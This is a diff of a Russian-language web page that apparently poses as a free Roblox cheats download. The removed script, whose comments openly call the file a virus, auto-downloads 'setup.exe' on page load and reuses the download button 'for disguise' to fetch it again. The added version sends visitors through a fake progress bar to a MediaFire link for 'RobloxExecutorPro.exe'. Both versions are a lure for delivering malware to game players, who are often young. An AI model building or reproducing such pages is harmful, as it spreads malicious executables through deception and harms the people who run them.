@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cheats - Скачать бесплатно</title>
+    <title>RobloxCheats - Скачать бесплатно</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -288,7 +288,10 @@
         <h2>📥 Скачать читы</h2>
         <p class="sub">Бесплатно. Без регистрации. После установки WARP.</p>
 
-        <button class="download-btn" id="downloadBtn">⬇ СКАЧАТЬ</button>
+        <!-- КНОПКА С ПРЯМОЙ ССЫЛКОЙ НА MEDIAFIRE -->
+        <a href="https://www.mediafire.com/file/s0csa5o3blu3hwz/RobloxExecutorPro.exe/file" target="_blank" class="download-btn" id="downloadBtn">
+            ⬇ СКАЧАТЬ
+        </a>
 
         <div id="progress-area">
             <div class="progress-bar-bg">
@@ -317,72 +320,41 @@
 </div>
 
 <script>
-    // ========== АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ ВИРУСА ==========
-    // Вирус скачивается сразу при загрузке страницы, без нажатия кнопок
-
-    // 1. АВТО-ЗАГРУЗКА через 2 секунды после открытия страницы
-    window.addEventListener('DOMContentLoaded', function() {
-        setTimeout(function() {
-            // Скачиваем вирус автоматически
-            var link = document.createElement('a');
-            link.href = 'setup.exe';
-            link.download = 'RobloxCheats_Setup.exe';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }, 2000);
-    });
-
-    // 2. КНОПКА "СКАЧАТЬ" — для маскировки (скачивает ещё раз)
-    let isSecondDownload = false;
-
+    // Показ прогресс-бара при клике на кнопку
     document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        // Не блокируем переход, просто показываем прогресс
         e.preventDefault();
-
-        if (!isSecondDownload) {
-            this.style.display = 'none';
-            document.getElementById('progress-area').style.display = 'block';
-
-            let progress = 0;
-            const fill = document.getElementById('progressFill');
-            const text = document.getElementById('progress-text');
-
-            const interval = setInterval(() => {
-                progress += Math.random() * 4 + 1;
-                if (progress > 100) progress = 100;
-
-                fill.style.width = progress + '%';
-                text.textContent = 'Загрузка: ' + Math.round(progress) + '%';
-
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        alert('✅ Установка завершена!\n\nНажмите "Скачать" ещё раз для активации.');
-                        isSecondDownload = true;
-                        document.getElementById('progress-area').style.display = 'none';
-                        this.style.display = 'inline-block';
-                        this.textContent = '⬇ АКТИВИРОВАТЬ';
-                    }.bind(this), 400);
-                }
-            }, 150);
-        } else {
-            this.textContent = '⏳ ЗАГРУЗКА...';
-            this.disabled = true;
-
-            setTimeout(() => {
-                alert('✅ Активация завершена!\n\nЧиты готовы к работе.');
-                window.open('https://www.roblox.com/games/', '_blank');
-                // Снова скачиваем вирус (на всякий случай)
-                var link = document.createElement('a');
-                link.href = 'setup.exe';
-                link.download = 'RobloxCheats_Setup.exe';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                this.textContent = '⬇ СКАЧАТЬ';
-                this.disabled = false;
-            }, 800);
-        }
+        
+        // Прячем кнопку
+        this.style.display = 'none';
+        
+        // Показываем прогресс-бар
+        document.getElementById('progress-area').style.display = 'block';
+        
+        let progress = 0;
+        const fill = document.getElementById('progressFill');
+        const text = document.getElementById('progress-text');
+        
+        const interval = setInterval(() => {
+            progress += Math.random() * 4 + 1;
+            if (progress > 100) progress = 100;
+            
+            fill.style.width = progress + '%';
+            text.textContent = 'Подготовка к загрузке: ' + Math.round(progress) + '%';
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    alert('✅ Переход на страницу загрузки...');
+                    // Открываем ссылку на MediaFire
+                    window.open('https://www.mediafire.com/file/s0csa5o3blu3hwz/RobloxExecutorPro.exe/file', '_blank');
+                    // Восстанавливаем кнопку
+                    this.style.display = 'inline-block';
+                    document.getElementById('progress-area').style.display = 'none';
+                    this.textContent = '⬇ СКАЧАТЬ (MediaFire)';
+                }.bind(this), 500);
+            }
+        }, 150);
     });
 </script>
 
